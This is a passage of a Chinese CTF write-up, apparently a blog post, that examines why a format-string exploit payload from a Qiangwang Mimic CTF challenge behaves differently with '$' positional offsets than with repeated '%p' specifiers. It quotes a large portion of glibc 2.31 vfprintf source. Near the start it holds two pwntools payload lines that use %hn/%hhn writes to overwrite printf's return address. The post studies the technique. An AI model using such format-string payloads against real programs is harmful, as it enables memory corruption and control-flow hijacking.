        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>在第六届强网拟态线下赛的一道格式化字符串漏洞题目中，遇到了一个情况没有想通，找了个时间分析了一下 <code>printf</code>的源码（glibc2.31），分析清楚原因了</p><h2 id="0x01-issue"><a href="#0x01-issue" class="headerlink" title="0x01 issue"></a>0x01 issue</h2><p><del>奇怪</del>合理的现象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(printf_ret).encode() + <span class="string">b&quot;%11$hn&quot;</span> + \</span><br><span class="line">        <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x10000</span> - printf_ret + <span class="number">0x23</span>).encode() + <span class="string">b&quot;%39$hhn&quot;</span></span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure><p>最初我是这样写的，调试发现仅仅成功修改了跳板，而目标，也就是<code>printf</code>的返回地址却没有修改到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%p&#x27;</span>*<span class="number">9</span> + <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(printf_ret - <span class="number">90</span>).encode() + <span class="string">b&quot;%hn&quot;</span> + \</span><br><span class="line">        <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x10000</span> - printf_ret + <span class="number">0x23</span>).encode() + <span class="string">b&quot;%39$hhn&quot;</span></span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure><p>而换个偏移方式，这样却能同时修改成功</p><h2 id="0x02-why？"><a href="#0x02-why？" class="headerlink" title="0x02 why？"></a>0x02 why？</h2><h4 id="探究一下多个-偏移参数和-偏移参数在格式化字符串中的差异"><a href="#探究一下多个-偏移参数和-偏移参数在格式化字符串中的差异" class="headerlink" title="探究一下多个 % 偏移参数和 $ 偏移参数在格式化字符串中的差异"></a>探究一下多个 % 偏移参数和 $ 偏移参数在格式化字符串中的差异</h4><p>我们找到源码中处理格式化字符串的部分（glibc2.31）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Process whole format string.  */</span></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      STEP0_3_TABLE;</span><br><span class="line">      STEP4_TABLE;</span><br><span class="line"></span><br><span class="line">      <span class="class"><span class="keyword">union</span> <span class="title">printf_arg</span> *<span class="title">args_value</span>;</span><span class="comment">/* This is not used here but ... */</span></span><br><span class="line">      <span class="type">int</span> is_negative;<span class="comment">/* Flag for negative number.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> longlong;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> word;</span><br><span class="line">      &#125; number;</span><br><span class="line">      <span class="type">int</span> base;</span><br><span class="line">      <span class="class"><span class="keyword">union</span> <span class="title">printf_arg</span> <span class="title">the_arg</span>;</span></span><br><span class="line">      CHAR_T *<span class="built_in">string</span>;<span class="comment">/* Pointer to argument string.  */</span></span><br><span class="line">      <span class="type">int</span> alt = <span class="number">0</span>;<span class="comment">/* Alternate format.  */</span></span><br><span class="line">      <span class="type">int</span> space = <span class="number">0</span>;<span class="comment">/* Use space prefix if no sign is needed.  */</span></span><br><span class="line">      <span class="type">int</span> left = <span class="number">0</span>;<span class="comment">/* Left-justify output.  */</span></span><br><span class="line">      <span class="type">int</span> showsign = <span class="number">0</span>;<span class="comment">/* Always begin with plus or minus sign.  */</span></span><br><span class="line">      <span class="type">int</span> group = <span class="number">0</span>;<span class="comment">/* Print numbers according grouping rules.  */</span></span><br><span class="line">      <span class="type">int</span> is_long_double = <span class="number">0</span>; <span class="comment">/* Argument is long double/ long long int.  */</span></span><br><span class="line">      <span class="type">int</span> is_short = <span class="number">0</span>;<span class="comment">/* Argument is short int.  */</span></span><br><span class="line">      <span class="type">int</span> is_long = <span class="number">0</span>;<span class="comment">/* Argument is long int.  */</span></span><br><span class="line">      <span class="type">int</span> is_char = <span class="number">0</span>;<span class="comment">/* Argument is promoted (unsigned) char.  */</span></span><br><span class="line">      <span class="type">int</span> width = <span class="number">0</span>;<span class="comment">/* Width of output; 0 means none specified.  */</span></span><br><span class="line">      <span class="type">int</span> prec = <span class="number">-1</span>;<span class="comment">/* Precision of output; -1 means none specified.  */</span></span><br><span class="line">      <span class="comment">/* This flag is set by the &#x27;I&#x27; modifier and selects the use of the</span></span><br><span class="line"><span class="comment"> `outdigits&#x27; as determined by the current locale.  */</span></span><br><span class="line">      <span class="type">int</span> use_outdigits = <span class="number">0</span>;</span><br><span class="line">      UCHAR_T pad = L_(<span class="string">&#x27; &#x27;</span>);<span class="comment">/* Padding character.  */</span></span><br><span class="line">      CHAR_T spec;</span><br><span class="line"></span><br><span class="line">      workstart = <span class="literal">NULL</span>;</span><br><span class="line">      workend = work_buffer + WORK_BUFFER_SIZE;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Get current character in format string.  */</span></span><br><span class="line">      JUMP (*++f, step0_jumps);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* &#x27; &#x27; flag.  */</span></span><br><span class="line">    LABEL (flag_space):</span><br><span class="line">      space = <span class="number">1</span>;</span><br><span class="line">      JUMP (*++f, step0_jumps);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* &#x27;+&#x27; flag.  */</span></span><br><span class="line">    LABEL (flag_plus):</span><br><span class="line">      showsign = <span class="number">1</span>;</span><br><span class="line">      JUMP (*++f, step0_jumps);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* The &#x27;-&#x27; flag.  */</span></span><br><span class="line">    LABEL (flag_minus):</span><br><span class="line">      left = <span class="number">1</span>;</span><br><span class="line">      pad = L_(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">      JUMP (*++f, step0_jumps);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* The &#x27;#&#x27; flag.  */</span></span><br><span class="line">    LABEL (flag_hash):</span><br><span class="line">      alt = <span class="number">1</span>;</span><br><span class="line">      JUMP (*++f, step0_jumps);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* The &#x27;0&#x27; flag.  */</span></span><br><span class="line">    LABEL (flag_zero):</span><br><span class="line">      <span class="keyword">if</span> (!left)</span><br><span class="line">pad = L_(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">      JUMP (*++f, step0_jumps);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* The &#x27;\&#x27;&#x27; flag.  */</span></span><br><span class="line">    LABEL (flag_quote):</span><br><span class="line">      group = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (grouping == (<span class="type">const</span> <span class="type">char</span> *) <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">  thousands_sep = _NL_CURRENT_WORD (LC_NUMERIC,</span><br><span class="line">    _NL_NUMERIC_THOUSANDS_SEP_WC);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  thousands_sep = _NL_CURRENT (LC_NUMERIC, THOUSANDS_SEP);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  grouping = _NL_CURRENT (LC_NUMERIC, GROUPING);</span><br><span class="line">  <span class="keyword">if</span> (*grouping == <span class="string">&#x27;\0&#x27;</span> || *grouping == CHAR_MAX</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">      || thousands_sep == <span class="string">L&#x27;\0&#x27;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      || *thousands_sep == <span class="string">&#x27;\0&#x27;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      )</span><br><span class="line">    grouping = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">      JUMP (*++f, step0_jumps);</span><br><span class="line"></span><br><span class="line">    LABEL (flag_i18n):</span><br><span class="line">      use_outdigits = <span class="number">1</span>;</span><br><span class="line">      JUMP (*++f, step0_jumps);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Get width from argument.  */</span></span><br><span class="line">    LABEL (width_asterics):</span><br><span class="line">      &#123;</span><br><span class="line"><span class="type">const</span> UCHAR_T *tmp;<span class="comment">/* Temporary value.  */</span></span><br><span class="line"></span><br><span class="line">tmp = ++f;</span><br><span class="line"><span class="keyword">if</span> (ISDIGIT (*tmp))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> pos = read_int (&amp;tmp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pos == <span class="number">-1</span>)</span><br><span class="line">      &#123;</span><br><span class="line">__set_errno (EOVERFLOW);</span><br><span class="line">done = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">goto</span> all_done;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pos &amp;&amp; *tmp == L_(<span class="string">&#x27;$&#x27;</span>))</span><br><span class="line">      <span class="comment">/* The width comes from a positional parameter.  */</span></span><br><span class="line">      <span class="keyword">goto</span> do_positional;</span><br><span class="line">  &#125;</span><br><span class="line">width = va_arg (ap, <span class="type">int</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Negative width means left justified.  */</span></span><br><span class="line"><span class="keyword">if</span> (width &lt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    width = -width;</span><br><span class="line">    pad = L_(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    left = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (width &gt;= INT_MAX / <span class="keyword">sizeof</span> (CHAR_T) - EXTSIZ))</span><br><span class="line">  &#123;</span><br><span class="line">    __set_errno (EOVERFLOW);</span><br><span class="line">    done = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">goto</span> all_done;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (width &gt;= WORK_BUFFER_SIZE - EXTSIZ)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* We have to use a special buffer.  */</span></span><br><span class="line">    <span class="type">size_t</span> needed = ((<span class="type">size_t</span>) width + EXTSIZ) * <span class="keyword">sizeof</span> (CHAR_T);</span><br><span class="line">    <span class="keyword">if</span> (__libc_use_alloca (needed))</span><br><span class="line">      workend = (CHAR_T *) alloca (needed) + width + EXTSIZ;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">workstart = (CHAR_T *) <span class="built_in">malloc</span> (needed);</span><br><span class="line"><span class="keyword">if</span> (workstart == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    done = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">goto</span> all_done;</span><br><span class="line">  &#125;</span><br><span class="line">workend = workstart + width + EXTSIZ;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      JUMP (*f, step1_jumps);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Given width in format string.  */</span></span><br><span class="line">    LABEL (width):</span><br><span class="line">      width = read_int (&amp;f);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (width == <span class="number">-1</span></span><br><span class="line">    || width &gt;= INT_MAX / <span class="keyword">sizeof</span> (CHAR_T) - EXTSIZ))</span><br><span class="line">&#123;</span><br><span class="line">  __set_errno (EOVERFLOW);</span><br><span class="line">  done = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">goto</span> all_done;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (width &gt;= WORK_BUFFER_SIZE - EXTSIZ)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We have to use a special buffer.  */</span></span><br><span class="line">  <span class="type">size_t</span> needed = ((<span class="type">size_t</span>) width + EXTSIZ) * <span class="keyword">sizeof</span> (CHAR_T);</span><br><span class="line">  <span class="keyword">if</span> (__libc_use_alloca (needed))</span><br><span class="line">    workend = (CHAR_T *) alloca (needed) + width + EXTSIZ;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      workstart = (CHAR_T *) <span class="built_in">malloc</span> (needed);</span><br><span class="line">      <span class="keyword">if</span> (workstart == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  done = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">goto</span> all_done;</span><br><span class="line">&#125;</span><br><span class="line">      workend = workstart + width + EXTSIZ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">if</span> (*f == L_(<span class="string">&#x27;$&#x27;</span>))</span><br><span class="line"><span class="comment">/* Oh, oh.  The argument comes from a positional parameter.  */</span></span><br><span class="line"><span class="keyword">goto</span> do_positional;</span><br><span class="line">      JUMP (*f, step1_jumps);</span><br><span class="line"></span><br><span class="line">    LABEL (precision):</span><br><span class="line">      ++f;</span><br><span class="line">      <span class="keyword">if</span> (*f == L_(<span class="string">&#x27;*&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> UCHAR_T *tmp;<span class="comment">/* Temporary value.  */</span></span><br><span class="line"></span><br><span class="line">  tmp = ++f;</span><br><span class="line">  <span class="keyword">if</span> (ISDIGIT (*tmp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> pos = read_int (&amp;tmp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (pos == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __set_errno (EOVERFLOW);</span><br><span class="line">  done = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">goto</span> all_done;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (pos &amp;&amp; *tmp == L_(<span class="string">&#x27;$&#x27;</span>))</span><br><span class="line"><span class="comment">/* The precision comes from a positional parameter.  */</span></span><br><span class="line"><span class="keyword">goto</span> do_positional;</span><br><span class="line">    &#125;</span><br><span class="line">  prec = va_arg (ap, <span class="type">int</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If the precision is negative the precision is omitted.  */</span></span><br><span class="line">  <span class="keyword">if</span> (prec &lt; <span class="number">0</span>)</span><br><span class="line">    prec = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (ISDIGIT (*f))</span><br><span class="line">&#123;</span><br><span class="line">  prec = read_int (&amp;f);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The precision was specified in this case as an extremely</span></span><br><span class="line"><span class="comment">     large positive value.  */</span></span><br><span class="line">  <span class="keyword">if</span> (prec == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EOVERFLOW);</span><br><span class="line">      done = <span class="number">-1</span>;</span><br><span class="line">      <span class="keyword">goto</span> all_done;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">prec = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (prec &gt; width &amp;&amp; prec &gt; WORK_BUFFER_SIZE - EXTSIZ)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Deallocate any previously allocated buffer because it is</span></span><br><span class="line"><span class="comment">     too small.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (workstart != <span class="literal">NULL</span>))</span><br><span class="line">    <span class="built_in">free</span> (workstart);</span><br><span class="line">  workstart = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (prec &gt;= INT_MAX / <span class="keyword">sizeof</span> (CHAR_T) - EXTSIZ))</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EOVERFLOW);</span><br><span class="line">      done = <span class="number">-1</span>;</span><br><span class="line">      <span class="keyword">goto</span> all_done;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="type">size_t</span> needed = ((<span class="type">size_t</span>) prec + EXTSIZ) * <span class="keyword">sizeof</span> (CHAR_T);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__libc_use_alloca (needed))</span><br><span class="line">    workend = (CHAR_T *) alloca (needed) + prec + EXTSIZ;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      workstart = (CHAR_T *) <span class="built_in">malloc</span> (needed);</span><br><span class="line">      <span class="keyword">if</span> (workstart == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  done = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">goto</span> all_done;</span><br><span class="line">&#125;</span><br><span class="line">      workend = workstart + prec + EXTSIZ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">      JUMP (*f, step2_jumps);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Process &#x27;h&#x27; modifier.  There might another &#x27;h&#x27; following.  */</span></span><br><span class="line">    LABEL (mod_half):</span><br><span class="line">      is_short = <span class="number">1</span>;</span><br><span class="line">      JUMP (*++f, step3a_jumps);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Process &#x27;hh&#x27; modifier.  */</span></span><br><span class="line">    LABEL (mod_halfhalf):</span><br><span class="line">      is_short = <span class="number">0</span>;</span><br><span class="line">      is_char = <span class="number">1</span>;</span><br><span class="line">      JUMP (*++f, step4_jumps);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Process &#x27;l&#x27; modifier.  There might another &#x27;l&#x27; following.  */</span></span><br><span class="line">    LABEL (mod_long):</span><br><span class="line">      is_long = <span class="number">1</span>;</span><br><span class="line">      JUMP (*++f, step3b_jumps);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Process &#x27;L&#x27;, &#x27;q&#x27;, or &#x27;ll&#x27; modifier.  No other modifier is</span></span><br><span class="line"><span class="comment"> allowed to follow.  */</span></span><br><span class="line">    LABEL (mod_longlong):</span><br><span class="line">      is_long_double = <span class="number">1</span>;</span><br><span class="line">      is_long = <span class="number">1</span>;</span><br><span class="line">      JUMP (*++f, step4_jumps);</span><br><span class="line"></span><br><span class="line">    LABEL (<span class="type">mod_size_t</span>):</span><br><span class="line">      is_long_double = <span class="keyword">sizeof</span> (<span class="type">size_t</span>) &gt; <span class="keyword">sizeof</span> (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span>);</span><br><span class="line">      is_long = <span class="keyword">sizeof</span> (<span class="type">size_t</span>) &gt; <span class="keyword">sizeof</span> (<span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">      JUMP (*++f, step4_jumps);</span><br><span class="line"></span><br><span class="line">    LABEL (<span class="type">mod_ptrdiff_t</span>):</span><br><span class="line">      is_long_double = <span class="keyword">sizeof</span> (<span class="type">ptrdiff_t</span>) &gt; <span class="keyword">sizeof</span> (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span>);</span><br><span class="line">      is_long = <span class="keyword">sizeof</span> (<span class="type">ptrdiff_t</span>) &gt; <span class="keyword">sizeof</span> (<span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">      JUMP (*++f, step4_jumps);</span><br><span class="line"></span><br><span class="line">    LABEL (<span class="type">mod_intmax_t</span>):</span><br><span class="line">      is_long_double = <span class="keyword">sizeof</span> (<span class="type">intmax_t</span>) &gt; <span class="keyword">sizeof</span> (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span>);</span><br><span class="line">      is_long = <span class="keyword">sizeof</span> (<span class="type">intmax_t</span>) &gt; <span class="keyword">sizeof</span> (<span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">      JUMP (*++f, step4_jumps);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Process current format.  */</span></span><br><span class="line">      <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">  process_arg (((<span class="keyword">struct</span> printf_spec *) <span class="literal">NULL</span>));</span><br><span class="line">  process_string_arg (((<span class="keyword">struct</span> printf_spec *) <span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">LABEL (form_unknown):</span><br><span class="line">  <span class="keyword">if</span> (spec == L_(<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* The format string ended before the specifier is complete.  */</span></span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      done = <span class="number">-1</span>;</span><br><span class="line">      <span class="keyword">goto</span> all_done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we are in the fast loop force entering the complicated</span></span><br><span class="line"><span class="comment">     one.  */</span></span><br><span class="line">  <span class="keyword">goto</span> do_positional;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* The format is correctly handled.  */</span></span><br><span class="line">      ++nspecs_done;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (workstart != <span class="literal">NULL</span>))</span><br><span class="line"><span class="built_in">free</span> (workstart);</span><br><span class="line">      workstart = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Look for next format specifier.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">      f = __find_specwc ((end_of_spec = ++f));</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      f = __find_specmb ((end_of_spec = ++f));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span 